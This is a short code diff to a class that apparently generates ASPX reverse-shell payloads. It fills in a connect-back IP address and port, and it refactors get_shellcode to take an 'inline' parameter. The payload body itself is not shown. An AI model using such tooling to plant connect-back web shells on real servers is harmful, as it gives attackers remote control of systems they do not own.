@@ -82,5 +82,5 @@ class AspxShellcode(Shellcode):
         aspx = aspx.replace("LOCALHOST", str(self.CONNECTBACK_IP)).replace("LOCALPORT", str(self.CONNECTBACK_PORT))
         return aspx
 
-    def get_shellcode(self):
-        return self.get_reverse(True)
+    def get_shellcode(self, inline=False):
+        return self.get_reverse(inline)
